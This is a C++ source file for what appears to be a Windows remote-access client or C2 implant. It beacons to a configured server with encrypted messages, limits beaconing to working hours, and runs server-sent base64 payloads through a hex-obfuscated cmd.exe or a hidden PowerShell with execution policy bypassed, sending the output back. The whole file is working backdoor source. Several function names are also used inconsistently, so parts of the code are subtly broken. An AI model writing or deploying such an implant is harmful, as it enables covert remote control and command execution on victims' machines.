#include "include\Client.h"
#include "include\Crypto.h"
#include "include\Base64.h"
#include "include\Network.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

void signalHandler(int signal) {
    if (should_run) {
        logIt("SIGINT received. Shutting down gracefully...");
        should_run = false;
        if (client_socket != -1) {
            close_socket(client_socket);
        }
        exit(0);
    }
}

void logIt(const string& message) {
    if (LOGGING) {
        if (!logStream.is_open()) {
            logStream.open("logs/client.log", ios::app);
        }
        if (logStream.is_open()) {
            auto now = chrono::system_clock::now();
            auto nowTime = chrono::system_clock::to_time_t(now);
            struct tm timeinfo;
            localtime_s(&timeinfo, &nowTime);
            char buffer[25];
            strftime(buffer, sizeof(buffer), "%Y-%m-%dT%H:%M:%S", &timeinfo);
            logStream << "[" << buffer << "] " << message << endl;
        }
    }
}

string getSessionId() {
    string ip_address = get_ip_address(client_socket);
    logIt("IP Address: " + ip_address);
    int ip_sum = 0;
    for (const auto& octet : split(ip_address, '.')) {
        ip_sum += stoi(octet);
    }
    return sha256(ip_address + "<>" + to_string(ip_sum)).substr(0, 32);
}

int getRetryInterval(int retries) {
    return retries < RETRY_INTERVALS.size() ? RETRY_INTERVALS[retries] : 0;
}

void sendCommand(const string& response) {
    string session_id = getSessionId();
    logIt("Session ID: " + session_id);
    string encrypted = Crypto::encryptData(response, session_id);
    if (encrypted.length() >= CHUNK_SIZE) {
        for (size_t i = 0; i < encrypted.length(); i += CHUNK_SIZE) {
            string chunk = encrypted.substr(i, CHUNK_SIZE);
            if (i + CHUNK_SIZE >= encrypted.length()) {
                chunk += "--END--";
            }
            send_data(client_socket, chunk);
            logIt("Sent Chunk: " + chunk);
        }
    }
    else {
        send_data(client_socket, encrypted);
        logIt("Sent Data: " + encrypted);
    }
}

void sendBeacon() {
    sendCommand(R"({"response":{"beacon":true,"version":")" + string(CVER) + R"(","type":")" + string(TYPE) + R"("}})");
}

string utf8To16(const string& str) {
    wstring_convert<codecvt_utf8_utf16<char16_t>, char16_t> converter;
    u16string utf16 = converter.from_bytes(str);
    return string(reinterpret_cast<const char*>(utf16.data()), utf16.size() * sizeof(char16_t));
}

string runCommand(const string& command, const string& payload, bool isFile = false) {
    try {
        if (command.empty()) {
            throw runtime_error("No command provided.");
        }
        if (command != "cmd" && command != "ps") {
            throw runtime_error("Unsupported command.");
        }

        string fullCommand;
        if (command == "cmd") {
            if (payload.find(';') != string::npos || payload.find('&') != string::npos) {
                throw runtime_error("Invalid characters in payload.");
            }
            fullCommand = "\x63\x6d\x64\x2e\x65\x78\x65 /c " + payload;
        }
        else {  // "ps"
            string psCommand = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65 -NonInteractive -NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass ";
            if (isFile) {
                fullCommand = psCommand + "-File " + payload;
            }
            else {
                string encodedCmd = Base64::encode(utf8To16(payload));
                fullCommand = psCommand + "-EncodedCommand " + encodedCmd;
            }
        }

        FILE* pipe = _popen(fullCommand.c_str(), "r");
        if (!pipe) {
            throw runtime_error("Failed to execute command.");
        }

        string result;
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }

        int status = _pclose(pipe);
        if (status != 0) {
            throw runtime_error("Command failed with code " + to_string(status));
        }

        return result;
    }
    catch (const exception& e) {
        throw runtime_error("Failed to execute command: " + string(e.what()));
    }
}

string formatTime(long long milliseconds) {
    long long totalSeconds = milliseconds / 1000;
    long long days = totalSeconds / 86400;
    long long hours = (totalSeconds % 86400) / 3600;
    long long minutes = (totalSeconds % 3600) / 60;
    long long seconds = totalSeconds % 60;
    ostringstream oss;
    oss << days << "d " << hours << "h " << minutes << "m " << seconds << "s";
    return oss.str();
}

string getUptime() {
    auto currentTime = chrono::steady_clock::now();
    auto uptimeMillis = chrono::duration_cast<chrono::milliseconds>(currentTime - startTime).count();
    return formatTime(uptimeMillis);
}

void periodic_beacon(int interval) {
    while (should_run) {
        this_thread::sleep_for(chrono::seconds(interval));
        time_t now = time(nullptr);
        tm* local_time = localtime(&now);
        if (local_time->tm_wday >= 0 && local_time->tm_wday <= 4 && local_time->tm_hour >= 7 && local_time->tm_hour <= 19) {
            send_beacon();
        }
    }
}

void parseAction(const string& action) {
    try {
        vector<string> parts;
        string command;
        string payload = "";

        // Use regex to split by any whitespace
        regex pattern(R"((?:[^\s"]+|"[^"]*")+)");
        sregex_token_iterator it(action.begin(), action.end(), pattern, -1);
        sregex_token_iterator end;
        for (; it != end; ++it) {
            parts.push_back(*it);
        }

        command = parts[0];
        vector<string> properties(parts.begin() + 1, parts.end());

        logIt("Command: " + command + " - Properties: " + accumulate(properties.begin(), properties.end(), string(), [](const string& a, const string& b) { return a.empty() ? b : a + " " + b; }));

        if (command == "ps" || command == "cmd") {
            payload = Base64::decode(properties[0]);
        }
        else if (command == "up") {
            sendCommand(R"({ {"response", {"data",)" + getUptime() + R"(}} })");
        }
        else if (command == "die") {
            exitProcess = true;
            exit(0);
        }

        if (!payload.empty()) {
            string result = runCommand(command, payload);
            sendCommand(R"({ {"response", {"data",)" + result + R"(}} })");
        }
    }
    catch (const exception& e) {
        sendCommand(R"({ {"response", {"error", "Error: ")" + string(e.what()) + R"(}} })");
    }
}

void connectToServer() {
    while (should_run && connection_retries <= MAX_RETRIES) {
        try {
            client_socket = create_socket();
            connect_socket(client_socket, SERVER_ADDRESS, SERVER_PORT);
            logIt("Client " + CVER + " connected.");
            send_beacon();

            int beacon_interval = rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1) + BEACON_MIN_INTERVAL;
            thread beacon_thread(periodic_beacon, beacon_interval);

            while (should_run) {
                string data = receive_data(client_socket, CHUNK_SIZE);
                if (data.empty()) {
                    logIt("No Data received.");
                    break;
                }
                string session_id = get_session_id();
                logIt("Received Data: " + data);
                string action = Crypto::decryptData(data, session_id);
                if (!action.empty()) {
                    parse_action(action);
                }
            }

            beacon_thread.join();
        }
        catch (const exception& e) {
            logIt("ConnectionException: " + string(e.what()));
        }

        if (client_socket != -1) {
            close_socket(client_socket);
        }

        if (should_run) {
            connection_retries++;
            if (connection_retries <= MAX_RETRIES) {
                int retry_interval = RETRY_INTERVALS[min(connection_retries - 1, static_cast<int>(RETRY_INTERVALS.size()) - 1)];
                logIt("Attempting to reconnect in " + to_string(retry_interval) + " seconds...");
                this_thread::sleep_for(chrono::seconds(retry_interval));
            }
            else {
                logIt("Max retries reached. Exiting.");
                should_run = false;
            }
        }
    }
}

int main() {
    signal(SIGINT, handle_sigint);
    start_time = chrono::system_clock::now();
    connect_to_server();
    return 0;
}